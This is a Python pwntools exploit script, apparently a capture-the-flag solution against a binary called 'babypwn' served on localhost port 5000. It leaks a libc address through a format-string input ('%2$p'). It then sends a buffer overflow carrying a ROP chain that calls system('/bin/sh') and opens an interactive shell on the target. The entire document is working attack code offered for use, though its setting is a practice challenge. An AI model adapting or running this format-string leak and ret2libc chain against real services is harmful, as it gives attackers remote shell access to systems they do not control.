#!/usr/bin/env python3

from pwn import *
from struct import pack

exe = ELF("./main/babypwn",
          checksec=False
          )
libc = ELF("./main/libc.so.6",
           checksec=False
           )

context.binary = exe
context.log_level = "CRITICAL"
context.terminal = ["konsole", "-e"]

REMOTE = ("localhost", 5000)

args.local = False
args.debug = False
if args.local == False:
    args.debug = False


class Exploit:
    def __init__(self):
        if args.local:
            self.process = "process()"
        else:
            self.process = "remote(REMOTE[0], REMOTE[1])"
        self.debug = args.debug

    def get_libc_base(self, proc: process):
        proc.sendafter(b"What is your name?\n", b"%2$p|\n")
        # proc.interactive()
        libc_base = proc.recvuntil(b"|")[6:-2]+b"0"
        libc_base = int(libc_base, 16)-0x23a70
        return libc_base

    def conn(self, proc: process, libc_base):
        proc.sendafter(b"What's your favorite :msfrog: emote?\n",
                       b"\x00"*96 +
                       pack("<Q", ROP(libc).find_gadget(["pop rdi", "ret"])[0] + libc_base) +
                       pack("<Q", next(libc.search(b"/bin/sh\x00"))+libc_base) +
                       pack("<Q", ROP(libc).find_gadget(["ret"])[0] + libc_base) +
                       pack("<Q", libc.symbols["system"] + libc_base)
                       )
        proc.sendline()
        
    def start(self):
        '''start the exploit'''
        proc: process = eval(self.process)
        if self.debug:
            script = """
            source /usr/share/pwndbg/gdbinit.py
            # source /usr/share/peda/peda.py
            # source /usr/share/gef/gef.py
            set step-mode on
            # set pagination off
            set logging enabled off
            
            break *_ZN7babypwn4main17h8f55ddfb4d984bd7E+297
            continue
            
            # x/100wx $rsp-100
            """
            gdb.attach(proc, gdbscript=script)
        libc_base = self.get_libc_base(proc)
        self.conn(proc, libc_base)
        proc.interactive()
        proc.close()


if __name__ == "__main__":
    Exploit().start()
